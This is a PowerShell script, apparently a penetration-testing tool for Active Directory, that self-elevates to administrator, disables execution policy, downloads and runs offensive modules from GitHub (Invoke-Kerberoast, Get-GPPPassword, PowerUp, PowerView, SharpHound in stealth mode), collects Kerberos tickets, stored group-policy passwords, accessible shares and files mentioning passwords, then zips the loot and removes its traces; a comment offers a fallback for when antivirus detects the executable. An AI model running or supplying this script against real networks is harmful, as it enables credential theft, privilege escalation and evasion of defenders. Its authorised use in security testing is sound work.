Write-Host "###########################################################################################################" -ForegroundColor Green
Write-Host "##   Active Directory Assessment and Privilege Escalation Script v1.1                                    ##" -ForegroundColor Green
Write-Host "##   Developed By Hausec                                                                                 ##" -ForegroundColor Green
Write-Host "##                                                                                                       ##" -ForegroundColor Green
Write-Host "##   Credit for .ps1s goes to Tim Medin, and the people working on Empire, BloodHound, and PowerSploit   ##" -ForegroundColor Green
Write-Host "##                                                                                                       ##" -ForegroundColor Green
Write-Host "##   If you see errors, that's normal. Unless your computer bluescreens or something. That's not normal. ##" -ForegroundColor Green
Write-Host "###########################################################################################################" -ForegroundColor Green
Set-ExecutionPolicy Unrestricted
#run as Admin check
If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{   
$arguments = "& '" + $myinvocation.mycommand.definition + "'"
Start-Process powershell -Verb runAs -ArgumentList $arguments
Break
}
#Create capture file
$path = "C:\Capture"
"Creating the capture folder..."
If(!(test-path $path))
{
      New-Item -ItemType Directory -Force -Path $path | Out-Null
	  Write-Host "Created $path!" -ForegroundColor Green
}
else
{
	Write-Host 	"Failed to create the capture folder, it already exists" -ForegroundColor Red
}
#specify modules folder
$modulepath=$env:psmodulepath.split(';')[0].split(' ')
Write-Host "Using Module path: $modulepath" -ForegroundColor Green

#create kerberoast PS module folder
If(!(test-path $modulepath/Kerberoast))
{
      New-Item -ItemType Directory -Force -Path $modulepath/Kerberoast | Out-Null
}

#download Kerberoast
Write-Host "Fetching Kerberoast module..."
$client = New-Object System.Net.WebClient
$client.DownloadFile("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1","$modulepath/Kerberoast/Kerberoast.psm1")
#Run Kerberoast
Write-Host "Importing module..." 
Import-Module Kerberoast.psm1
Write-Host "Running Kerberoast" -ForegroundColor  Yellow
Invoke-Kerberoast | Out-File $path\Kerberoast.krb 

#BloodHound Powershell Method -- Use this if .Exe is picked up by AV. 
<#
If(!(test-path $modulepath/Sharp))
{
      New-Item -ItemType Directory -Force -Path $modulepath/Sharp | Out-Null
}
Write-Host "Fetching SharpHound module..." 
$download = (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/BloodHoundAD/BloodHound/1.5/Ingestors/SharpHound.ps1")
$Encode = [System.Text.Encoding]::Unicode.GetBytes(($download))
$Base64 = [Convert]::ToBase64String($Encode)
$Decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($Base64))
$Decoded > $modulepath/Sharp/Sharp.psm1
Write-Host "Importing module..." 
Import-Module Sharp.psm1
Write-Host "Running SharpHound" -ForegroundColor  Yellow
Invoke-BloodHound -CSVFolder $path | Out-Null
#>

#BloodHound EXE method
If(!(test-path $modulepath/Sharp))
{
      New-Item -ItemType Directory -Force -Path $modulepath/Sharp | Out-Null
}
Write-Host "Fetching Sharphound.exe..."
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$client = New-Object System.Net.WebClient
$client.DownloadFile("https://github.com/BloodHoundAD/BloodHound/blob/1.5/Ingestors/SharpHound.exe?raw=true","$modulepath/Sharp/Sharp.exe")
Write-Host "Running SharpHound" -ForegroundColor  Yellow
& "$modulepath/Sharp/Sharp.exe" --Stealth --CSVFolder $path

#PrivEsc
If(!(test-path $modulepath/PrivEsc))
{
      New-Item -ItemType Directory -Force -Path $modulepath/PrivEsc | Out-Null
}
Write-Host "Fetching PowerUp module..."
$client = New-Object System.Net.WebClient
$client.DownloadFile("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1","$modulepath/PrivEsc/PrivEsc.psm1")
Write-Host "Importing module..."
Import-Module PrivEsc.ps1
Write-Host "Checking for Privilege Escalation paths...." -ForegroundColor Yellow
Invoke-AllChecks | Out-File $path\PrivEsc.txt

#create GPP PS module folder
If(!(test-path $modulepath/GPP))
{
      New-Item -ItemType Directory -Force -Path $modulepath/GPP | Out-Null
}
#check for GPP passwords
Write-Host "Fetching GPPP module..." 
$client = New-Object System.Net.WebClient
$client.DownloadFile("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Get-GPPPassword.ps1","$modulepath/GPP/GPP.psm1")
#import module
Write-Host "Importing module..." 
Import-Module gpp.psm1
#Run GPP. Verbose enabled so you know it's actually working or not
Write-Host "Checking for GPP Passwords, this usually takes a few minutes." -ForegroundColor Yellow
Get-GPPPassword -Verbose | Out-File $path\gpp.txt 

#PowerView
If(!(test-path $modulepath/PowerView))
{
      New-Item -ItemType Directory -Force -Path $modulepath/PowerView | Out-Null
}
Write-Host "Fetching PowerView module..." 
$client = New-Object System.Net.WebClient
$client.DownloadFile("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1","$modulepath/PowerView/PowerView.psm1")
Write-Host "Importing module..."
Import-Module PowerView.psm1
Write-Host "Searching for SMB Shares..." -ForegroundColor Yellow
Invoke-ShareFinder -CheckShareAccess -Threads 20 | Out-File $path\ShareFinder.txt
Write-Host "Looking for sensitive files (Grab a coffee, this might take awhile)" -ForegroundColor Yellow
#Edit the terms if you want to look for different strings in files. Comment out this cmdlet if it takes too long.
Invoke-FileFinder -Verbose -Terms password -OutFile $path\FileFinder.txt
Write-Host "Checking for exploitable systems..." -ForegroundColor Yellow
Get-ExploitableSystem -Verbose | Export-Csv $path\ExploitableSystem.txt

#Zip it all up and remove leftovers
Compress-Archive -Path $path -Update -DestinationPath C:\Capture.zip
Remove-Item -Recurse -Force "$modulepath/Kerberoast"
Remove-Item -Recurse -Force "$modulepath/PrivEsc"
Remove-Item -Recurse -Force "$modulepath/SharpHound"
Remove-Item -Recurse -Force "$modulepath/PowerView"
Remove-Item -Recurse -Force $path
Write-Host "Done! Results stored in the Capture.zip file!" -ForegroundColor Green
